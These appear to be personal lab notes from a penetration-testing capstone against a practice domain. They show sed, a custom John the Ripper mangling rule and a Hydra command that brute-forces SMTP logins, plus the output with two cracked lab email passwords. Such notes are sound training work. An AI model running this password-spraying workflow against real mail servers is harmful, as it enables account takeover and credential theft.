
### Domain
Add domain to end of every [[Website web.thereserve.loc#Create a file with the names (users.txt)]]
```
sed -i 's/$/@corp.thereserve.loc/' users.txt
```

### Custom rules
- Add the following to the bottom of john.conf.
```
	#Custom Rules

	[List.Rules:Capstone]

	Az"[0-9]" $[!@#%^]
```

- Run the following command to create a mangled passwords file.
```
	john --wordlist=password_base_list.txt --rules=Capstone --stdout > mangled-passwords.txt

```

### HYDRA
Getting some email's credentials .
```
hydra -L users.txt -P mangled-passwords.txt smtp://10.200.103.11 -V -o smtp-results.txt

cat smtp-results.txt
```
[25][smtp] host: 10.200.103.11   
login: laura.wood@corp.thereserve.loc   
password: Password1@

[25][smtp] host: 10.200.103.11   
login: mohammad.ahmed@corp.thereserve.loc   
password: Password1!
